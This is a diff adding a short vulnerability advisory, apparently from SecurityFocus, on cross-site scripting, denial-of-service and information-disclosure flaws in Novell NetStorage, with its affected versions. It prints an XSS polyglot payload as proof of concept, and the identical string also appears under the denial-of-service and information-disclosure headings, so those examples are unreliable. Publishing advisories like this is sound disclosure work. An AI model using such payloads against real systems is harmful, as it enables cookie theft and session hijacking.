@@ -1,0 +1,31 @@
+source: http://www.securityfocus.com/bid/34267/info
+
+Novell NetStorage is prone to the following remote vulnerabilities:
+
+- An information-disclosure vulnerability
+- A cross-site scripting vulnerability
+- A denial-of-service vulnerability
+
+Attackers can exploit these issues to obtain sensitive information, execute arbitrary script code, steal cookie-based authentication credentials, and cause a denial-of-service condition. Other attacks are also possible.
+
+The following are vulnerable:
+
+NetStorage 3.1.5-19 on Open Enterprise Server (OES)
+NetStorage 2.0.1 on NetWare 6.5 SP6 
+
+The following examples are available:
+
+Cross-site scripting:
+
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//-->
+</SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+
+Denial of service:
+
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--><
+/SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+
+Information disclosure:
+
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--><
+/SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> 
